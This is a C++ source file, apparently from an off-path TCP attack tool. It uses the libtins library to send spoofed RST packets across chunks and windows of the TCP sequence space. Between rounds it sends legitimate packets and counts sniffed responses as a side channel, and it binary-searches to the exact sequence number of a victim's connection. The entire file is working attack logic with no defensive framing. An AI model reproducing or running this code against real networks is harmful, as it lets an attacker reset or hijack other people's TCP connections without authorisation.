//
// Created by Jan Seredynski on 19/07/2018.
//

#include "find_sequence.h"


using namespace Tins;

uint32_t find_exact_sequence(IP legit_pkt, IP &spoofed_pkt, Clock &clock, uint32_t l_window);

uint32_t find_sequence(IP legit_pkt, IP &spoofed_pkt, Clock &clock){

    /*
     *  +       All possible windows        +
     *  | W | W | W | W | W | W | W | W | W |
     *
     *  +        Chunks                     +
     *  |   CHUNK   |   CHUNK   |   CHUNK   |   Round 1
     *
     */
    // Step 1
    unsigned int sniff_counter_debug = sniff_counter;
    const unsigned int chunk_size = CHUNK_SIZE;
    unsigned int seq = 0;

    legit_pkt.rfind_pdu<TCP>().set_flag(TCP::Flags::RST, 1);
    EthernetII legit_eth = EthernetII(serverMAC, info.hw_addr) / legit_pkt;


//    EthernetII spoofed_eth = EthernetII(serverMAC, victimtMAC) / spoofed_pkt;
    TCP &spoofed_tcp = spoofed_pkt.rfind_pdu<TCP>();
    spoofed_tcp.set_flag(TCP::Flags::RST, 1);

    uint32_t chunk_i=0, window_i = 0;

#ifdef MY_DEBUG_CHUNK_ID
    chunk_i=MY_DEBUG_CHUNK_ID;
#endif

    std::cout<<"+ - - - Seq Number Search - - - +\n";
    std::cout<<"Step 1 - find chunk\n";
    show_global_clock();

    for (; chunk_i < SEQ_MAX/chunk_size/WINDOW_SIZE; chunk_i++) {
        clock += std::chrono::seconds{1};
        std::this_thread::sleep_until(clock);
        auto start = std::chrono::high_resolution_clock::now();

        for (uint32_t block_i = 0; block_i < chunk_size; block_i++) {
            spoofed_tcp.seq((block_i * WINDOW_SIZE) + chunk_i*chunk_size*WINDOW_SIZE);
            sender.send(spoofed_pkt);
        }
        for (unsigned int i = 0; i < 100; i++){
            sender.send(legit_eth);
        }
        auto finish = std::chrono::high_resolution_clock::now();
        clock += std::chrono::seconds{2};
        std::this_thread::sleep_until(clock);
        std::chrono::duration<double> elapsed = finish - start;
        std::cout << "Step 1 - Chunk id: "<<chunk_i
                  <<".\tRange("<<chunk_i* chunk_size * WINDOW_SIZE
                  <<","
                  <<(chunk_i+1)* chunk_size * WINDOW_SIZE<<")\t"
                  <<"\tElapsed time: "<< elapsed.count()<< "s\t"
                  <<"sniff counter: "<<sniff_counter<<"\n";
        show_global_clock();
        if(elapsed.count() > 0.95){
            std::cout<<"Unexpected delay detected! Redoing chunk!";
            --chunk_i;
        }
        if(sniff_counter<100){
            sniff_counter=0;
            break;
        }
        sniff_counter=0;
    }
    std::cout <<"Found chunk: "<<chunk_i
              <<".Range ("
              <<chunk_i*chunk_size*WINDOW_SIZE
              <<","
              <<(chunk_i+1)*chunk_size*WINDOW_SIZE
              <<")\n";

    // Step 2
    std::cout<<"Step 2 - find window\n";
    show_global_clock();

    clock += std::chrono::seconds{1};
    std::this_thread::sleep_until(clock);

    uint32_t l_window = chunk_i*chunk_size;
    uint32_t r_window = (chunk_i+1)*chunk_size;
#ifdef MY_DEBUG_SEQ_STEP2_START
    l_window = MY_DEBUG_SEQ_STEP2_START / WINDOW_SIZE;
    r_window = MY_DEBUG_SEQ_STEP2_END / WINDOW_SIZE;
#endif
    uint32_t mid=0;
    while(l_window < r_window){
        mid = (l_window + r_window) / 2;
        std::cout<<"Step 2 - SEQ range: ("<<l_window*WINDOW_SIZE<<", "<<mid*WINDOW_SIZE<<")";
        auto start = std::chrono::high_resolution_clock::now();
        for (unsigned int i = l_window; i < mid; i++){
            spoofed_tcp.seq(i*WINDOW_SIZE);
            sender.send(spoofed_pkt, iface);
        }
        for (unsigned int i = 0; i < 100; i++){
            sender.send(legit_eth, iface);
        }
        auto finish = std::chrono::high_resolution_clock::now();
        std::chrono::duration<double> elapsed = finish - start;
        std::cout << "\nElapsed time: "<< elapsed.count() << "s\tsniff_counter:"<<sniff_counter<<"\n";
        clock += std::chrono::seconds{2};
        std::this_thread::sleep_until(clock);
        if(sniff_counter == 100){
            l_window = mid;
        } else{
            r_window = mid;
        }
        sniff_counter = 0;
        if(r_window - l_window <= 3){
            break;
        }
    }
    std::cout<<"Found window: "<<l_window<<" (Seq:"<<l_window*WINDOW_SIZE<<")\n";
    return find_exact_sequence(legit_pkt, spoofed_pkt, clock, l_window);
}

uint32_t find_left_border_sequence(IP legit_pkt, IP &spoofed_pkt, Clock &clock, uint32_t l_seq, uint32_t r_seq){
    TCP &spoofed_tcp = spoofed_pkt.rfind_pdu<TCP>();
    EthernetII legit_eth = EthernetII(serverMAC, info.hw_addr) / legit_pkt;
    std::cout<<"Step 3 - find sequence\n";
    uint32_t scope = 10000;
    uint32_t seq = l_seq;
    seq -= seq % scope; // zero last digits of seq
    while(true) {
        auto start = std::chrono::high_resolution_clock::now();
        spoofed_tcp.seq(seq);
        sender.send(spoofed_pkt);
        for (uint32_t i = 0; i < ACK_LIMIT; i++){
            sender.send(legit_eth, iface);
        }
        auto finish = std::chrono::high_resolution_clock::now();
        std::chrono::duration<double> elapsed = finish - start;
        std::cout << "seq:"<<seq<<"\tElapsed time: "
                  << elapsed.count() << "s\t";
        clock += std::chrono::seconds{2};
        std::this_thread::sleep_until(clock);
        std::cout<<"sniff count: "<<sniff_counter<<"\n";
        if(sniff_counter < ACK_LIMIT){
            break;
        }
        sniff_counter=0;
        seq+=scope;
    }

    std::cout<<"Found Seq:"<<seq<<"\n";
    return seq;
}


uint32_t find_exact_sequence(IP legit_pkt, IP &spoofed_pkt, Clock &clock, uint32_t l_window){

    uint32_t window_error_offset = 3;
    return find_left_border_sequence(legit_pkt,
                              spoofed_pkt,
                              clock,
                              (l_window-window_error_offset)*WINDOW_SIZE,
                              (l_window+window_error_offset)*WINDOW_SIZE);
}









